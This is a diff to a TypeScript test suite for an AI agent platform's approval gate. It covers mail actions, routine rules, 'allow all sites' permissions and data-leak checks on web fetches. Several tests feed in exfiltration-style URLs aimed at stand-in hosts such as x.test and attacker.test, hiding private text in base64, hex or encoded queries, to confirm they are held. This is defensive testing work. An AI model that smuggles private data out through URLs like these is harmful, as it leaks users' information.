@@ -216,6 +216,7 @@ function fixture({
   unattended = trigger === "webhook",
   externalTaint = false,
   routineManagedKind,
+  routineRules = [] as string[],
   scratchpadItem,
   skillRows = [] as Record<string, unknown>[],
   secrets = [] as string[],
@@ -265,19 +266,22 @@ function fixture({
   parallel = false,
   pageBrowser,
   firewall = false,
+  semanticMemory,
   firewalledBots = [] as string[],
   groupId = null as string | null,
   ticketAuthor = null as string | null,
   otherGrants = 0,
-  sources = [] as { id: string; agentBotId: string | null }[],
+  sources = [] as { id: string; agentBotId: string | null; grantedTo?: string[] }[],
   scriptedRuntime = false,
 }: {
   /** Directly connected sources, keyed by the agent they belong to. */
-  sources?: { id: string; agentBotId: string | null }[];
+  sources?: { id: string; agentBotId: string | null; grantedTo?: string[] }[];
   /** The runtime says it is the scripted one. */
   scriptedRuntime?: boolean;
   /** The bot's Firewall switch at the start of the run. */
   firewall?: boolean;
+  /** A semantic memory provider the space has configured, with its default scope. */
+  semanticMemory?: { provider: unknown; defaultScope: string };
   /** Other agents in the space with Firewall on. */
   firewalledBots?: string[];
   /** The run is in this group thread; its members are `firewalledBots` plus bot-1. */
@@ -368,6 +372,8 @@ function fixture({
   externalTaint?: boolean;
   /** Makes the run a routine run; the routine's managedKind. */
   routineManagedKind?: string | null;
+  /** Tools the owner chose "Always for this routine" for. */
+  routineRules?: string[];
   /** The stored scratchpad item the gate looks up for scratchpad_update/complete. */
   scratchpadItem?: { category: string | null } | null;
   /** Stored skill rows the skill and tool lookups find. */
@@ -559,10 +565,27 @@ function fixture({
     },
     capabilityInstall: {
       count: vi.fn(
-        async ({ where }: { where: { id: string; agentBotId: string } }) =>
-          sources.filter(
-            (source) => source.id === where.id && source.agentBotId === where.agentBotId,
-          ).length,
+        async ({
+          where,
+        }: {
+          where: {
+            id?: string;
+            agentBotId?: string;
+            OR?: { agentBotId?: string; botAccess?: { some: { botId: string } } }[];
+          };
+        }) =>
+          where.OR
+            ? sources.filter((source) =>
+                where.OR!.some(
+                  (clause) =>
+                    (clause.agentBotId !== undefined && source.agentBotId === clause.agentBotId) ||
+                    (clause.botAccess !== undefined &&
+                      source.grantedTo?.includes(clause.botAccess.some.botId)),
+                ),
+              ).length
+            : sources.filter(
+                (source) => source.id === where.id && source.agentBotId === where.agentBotId,
+              ).length,
       ),
       findMany: vi.fn(async () => []),
     },
@@ -742,7 +765,11 @@ function fixture({
       ),
       findFirst: vi.fn(async () => scratchpadItem ?? null),
     },
-    actionApprovalRule: { findMany: vi.fn(async () => rules) },
+    actionApprovalRule: {
+      findMany: vi.fn(async ({ where }: { where?: { routineId?: string | null } } = {}) =>
+        where?.routineId ? routineRules.map((matchValue) => ({ matchValue })) : rules,
+      ),
+    },
     actionAutoReviewPreference: { findUnique: vi.fn(async () => ({ enabled: autoReview })) },
     externalEffect,
   };
@@ -868,7 +895,7 @@ function fixture({
       },
       commit,
     },
-    memoryProviders: { resolve: async () => null },
+    memoryProviders: { resolve: async () => (semanticMemory as never) ?? null },
     events: {
       append: appendEvent,
       pauseRunForInput,
@@ -1628,6 +1655,40 @@ describe("unattended mail_modify and mail_send", () => {
     expect(isApprovalPausedResult(f.results[0])).toBe(false);
   });
 
+  it("runs an Inbox agent's own-account mail_modify under a tool Allow, but not on another agent's account", async () => {
+    for (const [agentBotId, asks] of [
+      ["bot-1", false],
+      ["agent-x", true],
+    ] as const) {
+      const mail = {
+        listAccounts: vi.fn(async () => [{ id: "acct-1", address: "me@example.test" }]),
+      };
+      const f = fixture({
+        name: "mail_modify",
+        builtin: true,
+        rules: allow("mail_modify"),
+        mail,
+        unattended: true,
+        spawnKey: inboxAgentSpawnKey("user-1"),
+        connectionRows: [{ ...mailConnectionRow(), agentBotId, writesEnabled: true }],
+      });
+      f.setCalls([
+        { args: { id: "m1", account: "me@example.test", archive: true }, executionId: "call-1" },
+      ]);
+      f.prisma.cachedMailMessage.findFirst.mockResolvedValue({
+        threadId: "t1",
+        connectionId: "acct-1",
+      } as never);
+      f.prisma.cachedMailMessage.findMany.mockResolvedValue([
+        { fromAddress: "list@example.test" },
+      ] as never);
+      await f.run();
+      // Another agent's account is refused for a bot that is not its agent.
+      if (asks) expect(f.results[0]).toEqual({ error: expect.stringContaining("agent") });
+      else expect(isApprovalPausedResult(f.results[0])).toBe(false);
+    }
+  });
+
   it("asks for a mail_modify archive under a tool Allow when an earlier sender in the thread is a Contact", async () => {
     const f = mailFixture("mail_modify", allow("mail_modify"));
     f.prisma.cachedMailMessage.findMany.mockResolvedValue([
@@ -1636,8 +1697,9 @@ describe("unattended mail_modify and mail_send", () => {
     ] as never);
     f.prisma.contact.findMany.mockResolvedValue([{ email: "friend@example.test" }]);
     await f.run();
-    expect(f.pauseRunForInput).toHaveBeenCalledOnce();
-    expect(isApprovalPausedResult(f.results[0])).toBe(true);
+    // A routine has nobody to ask: the archive is skipped and the agent is told, so it reports it.
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
+    expect(f.results[0]).toEqual({ error: expect.stringContaining("was skipped") });
   });
 
   it("asks when INBOX is removed by label name, since that archives the thread too", async () => {
@@ -1649,15 +1711,17 @@ describe("unattended mail_modify and mail_send", () => {
         { fromAddress: "friend@example.test" },
       ] as never);
       await f.run();
-      expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+      expect(f.pauseRunForInput).not.toHaveBeenCalled();
+      expect(f.results[0]).toEqual({ error: expect.stringContaining("was skipped") });
     }
   });
 
-  it("asks for an archive of a message that is not cached, since its thread is unknown", async () => {
+  it("skips an archive of a message that is not cached, since its thread is unknown", async () => {
     const f = mailFixture("mail_modify", allow("mail_modify"));
     f.prisma.cachedMailMessage.findFirst.mockResolvedValue(null as never);
     await f.run();
-    expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
+    expect(f.results[0]).toEqual({ error: expect.stringContaining("was skipped") });
   });
 
   it("asks for a protected archive even when the call is attended and under a tool Allow", async () => {
@@ -1674,6 +1738,37 @@ describe("unattended mail_modify and mail_send", () => {
     ]);
     await f.run();
     expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+    // A saved rule cannot clear this card, so it says why and offers only Allow once and Deny.
+    const card = JSON.stringify(f.pauseRunForInput.mock.calls[0]);
+    expect(card).toContain(
+      "Asked because this conversation is from someone you marked important or saved as a contact.",
+    );
+    expect(card).not.toContain("Always allow");
+  });
+
+  it("says why an agent-account send asks and offers no Always allow", async () => {
+    const mail = {
+      listAccounts: vi.fn(async () => [{ id: "acct-1", address: "me@example.test" }]),
+    };
+    const f = fixture({
+      name: "mail_send",
+      builtin: true,
+      rules: allow("mail_send"),
+      mail,
+      spawnKey: inboxAgentSpawnKey("user-1"),
+      connectionRows: [{ ...mailConnectionRow(), agentBotId: "bot-1", writesEnabled: true }],
+    });
+    f.setCalls([
+      {
+        args: { account: "me@example.test", to: ["a@example.test"], subject: "Hi", body: "Hello" },
+        executionId: "call-1",
+      },
+    ]);
+    await f.run();
+    expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+    const card = JSON.stringify(f.pauseRunForInput.mock.calls[0]);
+    expect(card).toContain("Asked because this is another agent's account.");
+    expect(card).not.toContain("Always allow");
   });
 
   it("still runs a tool-Allowed archive of an unprotected thread and a protected thread's mark-read", async () => {
@@ -5181,6 +5276,10 @@ describe("outbound destinations", () => {
       actions: [
         { id: "allow", label: "Allow once" },
         { id: "always", label: "Always allow attacker.test" },
+        {
+          id: "always_bot_sites",
+          label: expect.stringContaining("Allow all sites for this agent"),
+        },
         { id: "deny", label: "Deny" },
       ],
     });
@@ -6555,6 +6654,450 @@ describe("agent firewall", () => {
   });
 });
 
+describe("fetching new sites without a card", () => {
+  const pausedCardOf = (f: ReturnType<typeof fixture>) =>
+    (f.pauseRunForInput.mock.calls as unknown as [{ blocks: Record<string, unknown>[] }][])[0]?.[0]
+      .blocks[0];
+  const exaKey = integrationAgentSpawnKey("srv-1");
+  const exaServer = [{ id: "srv-1", endpoint: "https://mcp.exa.ai/mcp", agentBotId: "bot-1" }];
+  const fetchNew = {
+    name: "web_fetch",
+    args: { url: "https://www.npmjs.com/package/x" },
+  };
+  const exa = (extra: Record<string, unknown> = {}) => {
+    const f = fixture({
+      builtin: true,
+      trigger: "bot_message",
+      spawnKey: exaKey,
+      mcpServers: exaServer,
+      peer: { senderInScope: true, linked: true },
+      ...extra,
+    });
+    f.setCalls([{ ...fetchNew, executionId: "call-1" }]);
+    return f;
+  };
+
+  it("lets the Exa agent fetch a new public site in a bot-to-bot run, with no card", async () => {
+    const f = exa();
+    await f.run();
+    expect(f.fetchedUrls).toEqual(["https://www.npmjs.com/package/x"]);
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
+  });
+
+  it("asks when the same agent is granted Gmail", async () => {
+    const f = exa({
+      connectionRows: [
+        {
+          ...mailConnectionRow(),
+          allAgents: false,
+          botAccess: [{ botId: "bot-1" }],
+        },
+      ],
+    });
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+    expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+  });
+
+  it("asks for an agent whose server is not on the research list", async () => {
+    const f = exa({
+      mcpServers: [
+        {
+          id: "srv-1",
+          endpoint: "https://mcp.example.com/mcp",
+          agentBotId: "bot-1",
+        },
+      ],
+    });
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+    expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+  });
+
+  it("asks when the Exa agent is firewalled, and refuses in a webhook run", async () => {
+    const firewalled = exa({ firewall: true });
+    await firewalled.run();
+    expect(firewalled.fetchedUrls).toEqual([]);
+    const webhook = exa({ trigger: "webhook" });
+    await webhook.run();
+    expect(webhook.fetchedUrls).toEqual([]);
+    expect(webhook.pauseRunForInput).not.toHaveBeenCalled();
+  });
+
+  const allSites = [
+    {
+      effect: "always_allow",
+      matchKind: "tool",
+      matchValue: "web_fetch",
+      botId: "bot-1",
+    },
+  ] as ActionApprovalRule[];
+
+  it("fetches any site for an agent the owner allowed all sites for", async () => {
+    const f = fixture({ builtin: true, rules: allSites });
+    f.setCalls([{ ...fetchNew, executionId: "call-1" }]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual(["https://www.npmjs.com/package/x"]);
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
+  });
+
+  it("does not honour the rule for a firewalled agent, a tainted run or a webhook run", async () => {
+    for (const extra of [{ firewall: true }, { trigger: "webhook" }, { externalTaint: true }]) {
+      const f = fixture({ builtin: true, rules: allSites, ...extra });
+      f.setCalls([{ ...fetchNew, executionId: "call-1" }]);
+      await f.run();
+      expect(f.fetchedUrls, JSON.stringify(extra)).toEqual([]);
+    }
+  });
+
+  it("lets an ordinary URL through under the rule and logs the decision without the URL", async () => {
+    const f = fixture({ builtin: true, rules: allSites });
+    f.setCalls([{ ...fetchNew, executionId: "call-1" }]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual(["https://www.npmjs.com/package/x"]);
+    const decided = (
+      f.events.append.mock.calls as unknown as [
+        { type: string; payload: Record<string, unknown> },
+      ][]
+    )
+      .map(([event]) => event)
+      .find((event) => event.type === "approval.decided" && event.payload.source === "all_sites");
+    expect(decided?.payload).toMatchObject({
+      tool: "web_fetch",
+      decision: "allow",
+      site: "npmjs.com",
+      reason: "clean",
+    });
+    expect(JSON.stringify(decided)).not.toContain("package/x");
+  });
+
+  it.each([
+    [
+      "an encoded payload",
+      "https://x.test/c?d=c3VwZXIgc2VjcmV0IGludGVybmFsIG5vdGVzIGZvciB0aGUgYm9hcmQ",
+      "long encoded value in the URL",
+    ],
+    ["a very long query", `https://x.test/c?d=${"y".repeat(220)}`, "unusually long URL"],
+  ])("holds %s under the rule, on a card that says why", async (_name, url, reason) => {
+    const f = fixture({ builtin: true, rules: allSites });
+    f.setCalls([{ name: "web_fetch", args: { url }, executionId: "call-1" }]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+    const card = (
+      f.pauseRunForInput.mock.calls as unknown as [{ blocks: { approvalReason?: string }[] }][]
+    )[0]![0].blocks[0]!;
+    expect(card.approvalReason).toBe(`Held before fetching: ${reason}.`);
+  });
+
+  describe("classifier layer", () => {
+    const shaped = `https://x.test/c?d=${"y".repeat(220)}`;
+    const run = (
+      decision: "pass" | "ask" | "error" | "throw",
+      extra: Record<string, unknown> = {},
+    ) => {
+      reviewMock.mockReset();
+      if (decision === "throw") reviewMock.mockRejectedValue(new Error("down"));
+      else reviewMock.mockResolvedValue({ decision, reason: "r", model: "mock" });
+      const f = fixture({ builtin: true, rules: allSites, autoReview: true, ...extra });
+      f.setCalls([{ name: "web_fetch", args: { url: shaped }, executionId: "call-1" }]);
+      return f;
+    };
+
+    it("clears a URL flagged for its shape, sending only the URL and an outline", async () => {
+      const f = run("pass");
+      await f.run();
+      expect(f.fetchedUrls).toEqual([shaped]);
+      const request = reviewMock.mock.calls[0]![0] as {
+        exfilFlag: { reason: string; indicators: string[] };
+        args: { url: string };
+        newSite: boolean;
+      };
+      expect(request.newSite).toBe(true);
+      expect(request.exfilFlag.reason).toBe("unusually long URL");
+      expect(JSON.stringify(request.exfilFlag)).not.toContain("yyyy");
+    });
+
+    it.each(["ask", "error", "throw"] as const)(
+      "keeps the card when the classifier says %s",
+      async (decision) => {
+        const f = run(decision);
+        await f.run();
+        expect(f.fetchedUrls).toEqual([]);
+        expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+      },
+    );
+
+    it("never asks the classifier about a URL that repeats private text", async () => {
+      reviewMock.mockReset();
+      reviewMock.mockResolvedValue({ decision: "pass", reason: "r", model: "mock" });
+      const f = fixture({
+        builtin: true,
+        rules: allSites,
+        autoReview: true,
+        knownBots: { "peer-1": null as unknown as string },
+        history: [
+          {
+            blocks: [
+              {
+                kind: "bot_message_received",
+                fromBotId: "peer-1",
+                text: "Priya Shah owes 48213 dollars",
+              },
+            ],
+          },
+        ],
+      });
+      f.setCalls([
+        {
+          name: "web_fetch",
+          args: { url: "https://www.npmjs.com/search?q=Priya+Shah" },
+          executionId: "c1",
+        },
+      ]);
+      await f.run();
+      expect(reviewMock).not.toHaveBeenCalled();
+      expect(f.fetchedUrls).toEqual([]);
+    });
+  });
+
+  it("holds a URL that hides a private figure in base64 or hex", async () => {
+    const received = {
+      kind: "bot_message_received",
+      fromBotId: "peer-1",
+      text: "Priya Shah owes 48213 dollars",
+    };
+    for (const encoded of [
+      Buffer.from("Priya Shah").toString("base64url"),
+      Buffer.from("Priya Shah").toString("hex"),
+      encodeURIComponent(encodeURIComponent("Priya Shah")),
+    ]) {
+      const f = fixture({
+        builtin: true,
+        rules: allSites,
+        knownBots: { "peer-1": null as unknown as string },
+        history: [{ blocks: [received] }],
+      });
+      f.setCalls([
+        {
+          name: "web_fetch",
+          args: { url: `https://www.npmjs.com/search?q=${encoded}` },
+          executionId: "c1",
+        },
+      ]);
+      await f.run();
+      expect(f.fetchedUrls, encoded).toEqual([]);
+    }
+  });
+
+  it("another agent's rule does not apply", async () => {
+    const f = fixture({
+      builtin: true,
+      rules: [{ ...allSites[0]!, botId: "bot-2" }] as ActionApprovalRule[],
+    });
+    f.setCalls([{ ...fetchNew, executionId: "call-1" }]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+  });
+
+  it("still holds a URL that repeats private data the run was sent", async () => {
+    const received = {
+      kind: "bot_message_received",
+      fromBotId: "peer-1",
+      text: "Priya Shah owes 48213 dollars",
+    };
+    const f = fixture({
+      builtin: true,
+      rules: allSites,
+      knownBots: { "peer-1": null as unknown as string },
+      history: [{ blocks: [received] }],
+    });
+    f.setCalls([
+      {
+        name: "web_fetch",
+        args: { url: "https://www.npmjs.com/search?q=Priya+Shah+48213" },
+        executionId: "call-1",
+      },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+    expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+  });
+
+  it("offers the all-sites choice on a new-site card, naming private access", async () => {
+    const f = fixture({
+      builtin: true,
+      mail: {
+        listAccounts: vi.fn(async () => [{ id: "acct-1", address: "me@example.test" }]),
+      },
+    });
+    f.setCalls([{ ...fetchNew, executionId: "call-1" }]);
+    await f.run();
+    const actions = (pausedCardOf(f) as { actions: { id: string; label: string }[] }).actions;
+    expect(actions.map((a) => a.id)).toEqual(["allow", "always", "always_bot_sites", "deny"]);
+    expect(actions[2]!.label).toMatch(/^Allow all sites for this agent \(it can read .*mail/);
+  });
+});
+
+describe("public research apps linked as Composio connections", () => {
+  const key = integrationAgentSpawnKey("connection-1");
+  const connection = (provider = "exa", extra: Record<string, unknown> = {}) => ({
+    id: "connection-1",
+    spaceId: "space-1",
+    userId: "user-1",
+    connectorId: "composio",
+    provider,
+    providerRef: "account-1",
+    displayName: provider,
+    status: "connected",
+    allAgents: false,
+    botAccess: [{ botId: "bot-1" }],
+    agentBotId: "bot-1",
+    writesEnabled: false,
+    ...extra,
+  });
+  const tool = (name: string, readOnly?: boolean): ConnectorTool => ({
+    name,
+    description: name,
+    inputSchema: { type: "object", properties: { query: { type: "string" } } },
+    ...(readOnly === undefined ? {} : { readOnly }),
+    route: { connectorId: "composio", toolName: name },
+  });
+  const run = (
+    toolName: string,
+    { provider = "exa", ...extra }: Record<string, unknown> = {},
+    query: string | Record<string, unknown> = "npm packages for csv parsing",
+  ) => {
+    const t = tool(toolName);
+    const f = fixture({
+      name: t.name,
+      spawnKey: key,
+      trigger: "bot_message",
+      peer: { senderInScope: true, linked: false },
+      route: t.route,
+      connectionRows: [connection(provider as string)],
+      availableTools: [t],
+      ...extra,
+    });
+    f.setCalls([{ args: typeof query === "string" ? { query } : query, executionId: "call-1" }]);
+    return f;
+  };
+
+  it.each([
+    ["exa", "EXA_SEARCH"],
+    ["exa", "EXA_GET_CONTENTS_FOR_URLS"],
+    ["tavily_mcp", "TAVILY_MCP_TAVILY_SEARCH"],
+    ["tavily_mcp", "TAVILY_MCP_TAVILY_EXTRACT"],
+  ])("runs %s's %s from a bot-to-bot run with no card", async (provider, toolName) => {
+    const f = run(toolName, { provider });
+    await f.run();
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
+    expect(f.execute).toHaveBeenCalledOnce();
+  });
+
+  it("still asks for a tool that is not a public search or page read", async () => {
+    // Writes are off for the account, so the tool is not even offered.
+    const f = run("EXA_CREATE_WEBSET");
+    await f.run();
+    expect(f.offeredTools).not.toContain("EXA_CREATE_WEBSET");
+    expect(f.execute).not.toHaveBeenCalled();
+  });
+
+  it("still asks for another app's agent, and for a webhook run", async () => {
+    const gmail = run("GMAIL_FETCH_EMAILS", { provider: "GMAIL" });
+    await gmail.run();
+    expect(gmail.execute).not.toHaveBeenCalled();
+    const webhook = run("EXA_SEARCH", { trigger: "webhook" });
+    await webhook.run();
+    expect(webhook.execute).not.toHaveBeenCalled();
+  });
+
+  it("asks when the query repeats private text the agent was sent", async () => {
+    const f = run(
+      "EXA_SEARCH",
+      {
+        knownBots: { "peer-1": null as unknown as string },
+        history: [
+          {
+            blocks: [
+              {
+                kind: "bot_message_received",
+                fromBotId: "peer-1",
+                text: "Priya Shah owes 48213 dollars",
+              },
+            ],
+          },
+        ],
+      },
+      "Priya Shah 48213",
+    );
+    await f.run();
+    expect(f.execute).not.toHaveBeenCalled();
+  });
+
+  it("fetches a new public site with no card, and loads no user memory", async () => {
+    const fact = "PRIVATE-USER-FACT-7731";
+    const t = tool("EXA_SEARCH");
+    const f = fixture({
+      builtin: true,
+      spawnKey: key,
+      trigger: "bot_message",
+      peer: { senderInScope: true, linked: false },
+      connectionRows: [connection()],
+      availableTools: [t],
+      existingSharedMemory: fact,
+    });
+    f.setCalls([
+      { name: "web_fetch", args: { url: "https://www.npmjs.com/package/x" }, executionId: "c1" },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual(["https://www.npmjs.com/package/x"]);
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
+    expect(JSON.stringify([f.request()!.instructions, f.request()!.history])).not.toContain(fact);
+    // Company facts could leave in a URL, so it gets neither the index nor the lookup tool.
+    expect(f.request()!.instructions).not.toContain("company_context_lookup");
+    expect(f.offeredTools).not.toContain("company_context_lookup");
+  });
+
+  it.each([
+    ["granted to it", { id: "src-1", agentBotId: null, grantedTo: ["bot-1"] }],
+    ["its own", { id: "src-1", agentBotId: "bot-1" }],
+  ])("asks when a directly connected source is %s", async (_name, source) => {
+    const f = fixture({
+      builtin: true,
+      spawnKey: key,
+      trigger: "bot_message",
+      peer: { senderInScope: true, linked: false },
+      connectionRows: [connection()],
+      availableTools: [tool("EXA_SEARCH")],
+      sources: [source],
+    });
+    f.setCalls([
+      { name: "web_fetch", args: { url: "https://www.npmjs.com/package/x" }, executionId: "c1" },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+  });
+
+  it("asks when the same agent is also granted another app", async () => {
+    const f = fixture({
+      builtin: true,
+      spawnKey: key,
+      trigger: "bot_message",
+      peer: { senderInScope: true, linked: false },
+      connectionRows: [
+        connection(),
+        { ...mailConnectionRow(), allAgents: false, botAccess: [{ botId: "bot-1" }] },
+      ],
+      availableTools: [tool("EXA_SEARCH")],
+    });
+    f.setCalls([
+      { name: "web_fetch", args: { url: "https://www.npmjs.com/package/x" }, executionId: "c1" },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+  });
+});
+
 describe("mail_reply_batch", () => {
   const replies = [
     { replyToId: "m1", to: ["sam@customer.example"], subject: "Re: one", body: "Hello one" },
@@ -6942,6 +7485,269 @@ describe("mail_reply_batch", () => {
       await f.run();
       expect(f.pauseRunForInput).not.toHaveBeenCalled();
       expect(f.results[0]).toEqual({ error: DENIED_ACTION_MESSAGE });
+    });
+  });
+});
+
+describe("public research agents and meeting text", () => {
+  const priya = {
+    kind: "bot_message_received",
+    fromBotId: "peer-1",
+    text: "Priya Shah owes 48213 dollars",
+  };
+
+  it("an Exa agent holding meeting text gets no all-sites choice on a new-site card", async () => {
+    const f = fixture({
+      builtin: true,
+      trigger: "bot_message",
+      peer: {
+        senderInScope: true,
+        linked: false,
+        ownerOrigin: true,
+        senderSpawnKey: integrationAgentSpawnKey("server-1"),
+      },
+      mcpServers: [
+        { id: "server-1", endpoint: "https://mcp.granola.ai/mcp", agentBotId: "peer-1" },
+      ],
+    });
+    f.setCalls([
+      { name: "web_fetch", args: { url: "https://www.npmjs.com/package/x" }, executionId: "c1" },
+    ]);
+    await f.run();
+    const card = (
+      f.pauseRunForInput.mock.calls as unknown as [{ blocks: { actions: { id: string }[] }[] }][]
+    )[0]![0].blocks[0]!;
+    expect(card.actions.map((a) => a.id)).toEqual(["allow", "deny"]);
+  });
+
+  it("checks every nested string of a research tool call, such as Tavily's urls list", async () => {
+    const key = integrationAgentSpawnKey("connection-1");
+    const t = {
+      name: "TAVILY_MCP_TAVILY_EXTRACT",
+      description: "extract",
+      inputSchema: { type: "object", properties: {} },
+      route: { connectorId: "composio", toolName: "TAVILY_MCP_TAVILY_EXTRACT" },
+    } as ConnectorTool;
+    const f = fixture({
+      name: t.name,
+      spawnKey: key,
+      trigger: "bot_message",
+      peer: { senderInScope: true, linked: false },
+      route: t.route,
+      availableTools: [t],
+      knownBots: { "peer-1": null as unknown as string },
+      history: [{ blocks: [priya] }],
+      connectionRows: [
+        {
+          id: "connection-1",
+          spaceId: "space-1",
+          userId: "user-1",
+          connectorId: "composio",
+          provider: "tavily_mcp",
+          displayName: "Tavily",
+          status: "connected",
+          allAgents: false,
+          botAccess: [{ botId: "bot-1" }],
+          agentBotId: "bot-1",
+          writesEnabled: false,
+        },
+      ],
+    });
+    f.setCalls([
+      {
+        args: { urls: ["https://example.org/?q=Priya+Shah+48213"], options: { depth: "basic" } },
+        executionId: "call-1",
+      },
+    ]);
+    await f.run();
+    expect(f.execute).not.toHaveBeenCalled();
+  });
+
+  it("gives a public research agent isolated memory, never the shared pool", async () => {
+    const save = vi.fn(async () => ({ ok: true }));
+    const f = fixture({
+      name: "save_memory",
+      builtin: true,
+      spawnKey: integrationAgentSpawnKey("connection-1"),
+      semanticMemory: {
+        provider: { save, recall: vi.fn(async () => null) },
+        defaultScope: "shared",
+      },
+      connectionRows: [
+        {
+          id: "connection-1",
+          spaceId: "space-1",
+          userId: "user-1",
+          connectorId: "composio",
+          provider: "exa",
+          displayName: "Exa",
+          status: "connected",
+          allAgents: false,
+          botAccess: [{ botId: "bot-1" }],
+          agentBotId: "bot-1",
+          writesEnabled: false,
+        },
+      ],
+    });
+    f.setCalls([{ args: { content: "note" }, executionId: "call-1" }]);
+    await f.run();
+    expect(save).toHaveBeenCalledWith(
+      expect.objectContaining({ scope: "isolated" }),
+      expect.anything(),
+    );
+  });
+});
+
+describe("Always for this routine and Auto Review of routine reads", () => {
+  const routine = (name: string, extra: Record<string, unknown> = {}) => {
+    const f = fixture({
+      name,
+      builtin: true,
+      trigger: "routine",
+      unattended: true,
+      routineManagedKind: null,
+      ...(name === "mail_send"
+        ? {
+            mail: {
+              listAccounts: vi.fn(async () => [{ id: "acct-1", address: "me@example.test" }]),
+            },
+          }
+        : {}),
+      ...extra,
+    });
+    f.setCalls([{ args: { path: "a.txt", content: "x", id: "T-1" }, executionId: "call-1" }]);
+    return f;
+  };
+  const cardActions = (f: ReturnType<typeof fixture>) =>
+    (
+      (
+        f.pauseRunForInput.mock.calls as unknown as [{ blocks: { actions: { id: string }[] }[] }][]
+      )[0]?.[0].blocks[0]?.actions ?? []
+    ).map((action) => action.id);
+
+  it("offers Always for this routine on a background write card, and keeps the reason", async () => {
+    const f = routine("write_file");
+    await f.run();
+    expect(cardActions(f)).toEqual(["allow", "always_routine", "deny"]);
+  });
+
+  it.each([
+    ["a send", "mail_send", {}],
+    ["a webhook run", "write_file", { trigger: "webhook" }],
+    ["a tainted run", "write_file", { externalTaint: true }],
+    ["a firewalled agent", "write_file", { firewall: true }],
+    ["an attended run", "write_file", { trigger: "user", unattended: false }],
+  ])("does not offer it for %s", async (_label, name, extra) => {
+    const f = routine(name, extra);
+    await f.run({ expectFailure: true });
+    expect(cardActions(f)).not.toContain("always_routine");
+  });
+
+  it("runs a tool the owner allowed for this routine with no card, and logs it", async () => {
+    const f = routine("write_file", { routineRules: ["write_file"] });
+    await f.run({ expectFailure: true });
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
+    const sources = (
+      f.events.append.mock.calls as unknown as [{ type: string; payload: { source?: string } }][]
+    )
+      .filter(([event]) => event.type === "approval.decided")
+      .map(([event]) => event.payload.source);
+    expect(sources).toContain("routine_allow");
+  });
+
+  it.each([
+    ["a send", "mail_send", {}],
+    ["a webhook run", "write_file", { trigger: "webhook" }],
+    ["a tainted run", "write_file", { externalTaint: true }],
+    ["a firewalled agent", "write_file", { firewall: true }],
+    ["another tool", "shell", {}],
+  ])("does not honour the routine rule for %s", async (_label, name, extra) => {
+    const f = routine(name, { routineRules: ["write_file", "mail_send"], ...extra });
+    await f.run({ expectFailure: true });
+    const sources = (
+      f.events.append.mock.calls as unknown as [{ type: string; payload: { source?: string } }][]
+    )
+      .filter(([event]) => event.type === "approval.decided")
+      .map(([event]) => event.payload.source);
+    expect(sources).not.toContain("routine_allow");
+    if (!(extra as { firewall?: boolean }).firewall)
+      expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+  });
+
+  it("stops honouring a routine rule once the run has read outside content", async () => {
+    const f = routine("write_file", { routineRules: ["write_file"] });
+    f.setCalls([
+      { name: "web_search", args: { query: "news" }, executionId: "call-1" },
+      { args: { path: "a.txt", content: "x" }, executionId: "call-2" },
+    ]);
+    await f.run({ expectFailure: true });
+    expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+  });
+
+  it("runs a listed read the owner allowed for this routine, without asking the judge", async () => {
+    reviewMock.mockReset();
+    reviewMock.mockResolvedValue({ decision: "ask", reason: "no", model: "mock" });
+    const f = routine("ticket_get", {
+      ticketBoard: true,
+      autoReview: true,
+      routineRules: ["ticket_get"],
+    });
+    await f.run({ expectFailure: true });
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
+    expect(reviewMock).not.toHaveBeenCalled();
+  });
+
+  describe("Auto Review of routine reads", () => {
+    const read = (decision: "pass" | "ask" | "throw", extra: Record<string, unknown> = {}) => {
+      reviewMock.mockReset();
+      if (decision === "throw") reviewMock.mockRejectedValue(new Error("down"));
+      else reviewMock.mockResolvedValue({ decision, reason: "fits", model: "mock" });
+      return routine("ticket_get", { ticketBoard: true, autoReview: true, ...extra });
+    };
+
+    it("lets the judge pass a private read in a clean routine run", async () => {
+      const f = read("pass");
+      await f.run({ expectFailure: true });
+      expect(reviewMock).toHaveBeenCalledOnce();
+      expect(f.pauseRunForInput).not.toHaveBeenCalled();
+    });
+
+    it.each(["ask", "throw"] as const)("asks a person when the judge says %s", async (decision) => {
+      const f = read(decision);
+      await f.run({ expectFailure: true });
+      expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+    });
+
+    it("never judges in a webhook or tainted run, or without a provider", async () => {
+      for (const extra of [
+        { trigger: "webhook" },
+        { externalTaint: true },
+        { autoReview: false },
+      ]) {
+        const f = read("pass", extra);
+        await f.run({ expectFailure: true });
+        expect(f.pauseRunForInput, JSON.stringify(extra)).toHaveBeenCalledOnce();
+      }
+      expect(reviewMock).not.toHaveBeenCalled();
+    });
+
+    it("never judges a write, a send, or a read after outside content", async () => {
+      reviewMock.mockReset();
+      reviewMock.mockResolvedValue({ decision: "pass", reason: "fits", model: "mock" });
+      for (const name of ["write_file", "mail_send"]) {
+        const f = routine(name, { autoReview: true });
+        await f.run({ expectFailure: true });
+        expect(f.pauseRunForInput, name).toHaveBeenCalledOnce();
+      }
+      expect(reviewMock).not.toHaveBeenCalled();
